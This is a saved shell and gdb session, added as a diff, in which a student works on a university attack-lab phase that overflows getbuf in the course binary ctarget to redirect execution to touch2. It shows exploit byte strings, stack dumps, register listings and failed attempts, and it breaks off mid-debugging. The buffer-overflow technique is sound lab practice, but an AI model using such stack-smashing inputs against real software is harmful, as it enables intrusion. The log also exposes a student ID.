@@ -1,0 +1,4271 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt | ./ctarget -q
+Cookie: 0x76ebdb56
+Type string:No exploit.  Getbuf returned 0x1
+Normal return
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt| ./ctarget -q
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0xdabdb640)
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:2:56 DB EB 76 00 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 8A 18 40 
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0xf7dd5640)
+FAILED
+[Inferior 1 (process 46267) exited normally]
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) disas test
+Dump of assembler code for function test:
+   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
+   0x00000000004019c6 <+4>:	mov    $0x0,%eax
+   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
+   0x00000000004019d0 <+14>:	mov    %eax,%esi
+   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
+   0x00000000004019d7 <+21>:	mov    $0x0,%eax
+   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
+   0x00000000004019e1 <+31>:	add    $0x8,%rsp
+   0x00000000004019e5 <+35>:	retq   
+End of assembler dump.
+(gdb) break *0x000000000040184f
+Breakpoint 1 at 0x40184f: file buf.c, line 14.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x000000000040184f in getbuf () at buf.c:14
+14	buf.c: No such file or directory.
+(gdb) run < ans2.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x000000000040184f in getbuf () at buf.c:14
+14	in buf.c
+(gdb) print $rsp
+$1 = (void *) 0x5561a088
+(gdb) x/8bx $rsp
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) x/64bx $rsp
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0xd0	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 46348] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+Type string:Misfire: You called touch2(0xf7dd5640)
+FAILED
+[Inferior 1 (process 3034) exited normally]
+(gdb) gdb getbuf
+Undefined command: "gdb".  Try "help".
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x000000000040184f
+Breakpoint 1 at 0x40184f: file buf.c, line 14.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x000000000040184f in getbuf () at buf.c:14
+14	buf.c: No such file or directory.
+(gdb) run < ans2.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x000000000040184f in getbuf () at buf.c:14
+14	in buf.c
+(gdb) x/64bx $rsp
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0xd0	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 6755] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans2.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans2.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x000000000040184f
+Breakpoint 1 at 0x40184f: file buf.c, line 14.
+(gdb) run < ans.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x000000000040184f in getbuf () at buf.c:14
+14	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0xd0	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) stepi
+Gets (dest=dest@entry=0x5561a088 "") at support.c:163
+163	support.c: No such file or directory.
+(gdb) stepi
+0x0000000000401a8c	163	in support.c
+(gdb) clear
+No breakpoint at this line.
+(gdb) delete 1
+(gdb) break *0x0000000000401859
+Breakpoint 2 at 0x401859: file buf.c, line 16.
+(gdb) run < ans.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0c0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+(gdb) ^CQuit
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 24116] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x56	0xdb	0xeb	0x76	0x00	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0c0:	0x8a	0x18	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) break touch2
+Breakpoint 2 at 0x40188a: file visible.c, line 40.
+(gdb) continue
+Continuing.
+
+Breakpoint 2, touch2 (val=4158477888) at visible.c:40
+40	visible.c: No such file or directory.
+(gdb) info registers
+rax            0x1	1
+rbx            0x55586000	1431855104
+rcx            0xaf	175
+rdx            0xa	10
+rsi            0x7ffff7dd6a10	140737351870992
+rdi            0x7ffff7dd5640	140737351865920
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a0c8	0x5561a0c8
+r8             0x7ffff7fce740	140737353934656
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x40188a	0x40188a <touch2>
+eflags         0x216	[ PF AF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/8bx 0x7ffff7dd5640
+0x7ffff7dd5640 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x00	0x00	0x00
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 24379] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans2.txt
+[huimin@lnxsrv09 ~/target17]$ print/x ans2.txt
+-bash: print/x: No such file or directory
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break touch2
+Breakpoint 1 at 0x40188a: file visible.c, line 40.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, touch2 (val=4158477888) at visible.c:40
+40	visible.c: No such file or directory.
+(gdb) print $rdi
+$1 = 140737351865920
+(gdb) print/x $rdi
+$2 = 0x7ffff7dd5640
+(gdb) x/8bx 0x0000000000401859
+0x401859 <getbuf+17>:	0x48	0x83	0xc4	0x38	0xc3	0x48	0x83	0xec
+(gdb) x/8bx 0x7ffff7dd5640
+0x7ffff7dd5640 <_IO_2_1_stdin_>:	0x88	0x20	0xad	0xfb	0x00	0x00	0x00	0x00
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x000000000040184c
+Breakpoint 2 at 0x40184c: file buf.c, line 14.
+(gdb) run < ans2.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, getbuf () at buf.c:14
+14	buf.c: No such file or directory.
+(gdb) info registers
+rax            0x0	0
+rbx            0x55586000	1431855104
+rcx            0x3a676e6972747320	4208453775971873568
+rdx            0x7ffff7dd6a00	140737351870976
+rsi            0x4031f0	4207088
+rdi            0x0	0
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x0	0
+r9             0x0	0
+r10            0x7ffff7fce740	140737353934656
+r11            0x7ffff7aa17c0	140737348507584
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x40184c	0x40184c <getbuf+4>
+eflags         0x216	[ PF AF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/8bx 0x5561a088
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) break *0x0000000000401859
+Breakpoint 3 at 0x401859: file buf.c, line 16.
+(gdb) continue
+Continuing.
+
+Breakpoint 3, 0x0000000000401859 in getbuf () at buf.c:16
+16	in buf.c
+(gdb) info registers
+rax            0x1	1
+rbx            0x55586000	1431855104
+rcx            0xaf	175
+rdx            0xa	10
+rsi            0x7ffff7dd6a10	140737351870992
+rdi            0x7ffff7dd5640	140737351865920
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x7ffff7fce740	140737353934656
+r9             0x0	0
+r10            0x22	34
+r11            0x246	582
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x401859	0x401859 <getbuf+17>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) break *0x000000000040184c
+Note: breakpoint 2 also set at pc 0x40184c.
+Breakpoint 4 at 0x40184c: file buf.c, line 14.
+(gdb) run < ans2.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, getbuf () at buf.c:14
+14	in buf.c
+(gdb) info registers
+rax            0x0	0
+rbx            0x55586000	1431855104
+rcx            0x3a676e6972747320	4208453775971873568
+rdx            0x7ffff7dd6a00	140737351870976
+rsi            0x4031f0	4207088
+rdi            0x0	0
+rbp            0x55685fe8	0x55685fe8
+rsp            0x5561a088	0x5561a088
+r8             0x0	0
+r9             0x0	0
+r10            0x7ffff7fce740	140737353934656
+r11            0x7ffff7aa17c0	140737348507584
+r12            0x1	1
+r13            0x0	0
+r14            0x0	0
+r15            0x0	0
+rip            0x40184c	0x40184c <getbuf+4>
+eflags         0x216	[ PF AF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/8bx 0x5561a088
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+(gdb) print $rsp
+$3 = (void *) 0x5561a088
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 39076] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break touch2
+Breakpoint 1 at 0x40188a: file visible.c, line 40.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040185d in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) continue
+Continuing.
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+[Inferior 1 (process 46501) exited with code 01]
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break touch2
+Breakpoint 1 at 0x40188a: file visible.c, line 40.
+(gdb) break *0x0000000000401859
+Breakpoint 2 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x8a	0x18	0x40	0x00	0x00
+0x5561a0c0:	0x00	0x00	0x00	0x56	0xdb	0xeb	0x76	0x00
+0x5561a0c8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0xe3	0x1e	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040185d in getbuf () at buf.c:16
+16	in buf.c
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 46634] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) break *0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x8a	0x18	0x40	0x56	0xdb
+0x5561a0c0:	0xeb	0x76	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0c8:	0x09	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0d0:	0xe3	0x1e	0x40	0x00	0x00	0x00	0x00	0x00
+0x5561a0d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0e0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0e8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f0:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a0f8:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+0x5561a100:	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4	0xf4
+(gdb) break touch2
+Breakpoint 2 at 0x40188a: file visible.c, line 40.
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000000076eb in ?? ()
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 46754] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt > ans2.txt
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) 
+(gdb) break *0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans2.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans2.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) x/128bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x8a	0x18	0x40	0x56	0xdb	0xeb	0x76	0x00
+0x5561a0c0:	0x00	0x19	0x40	0x00	0x00	0x00	0x00	0x00
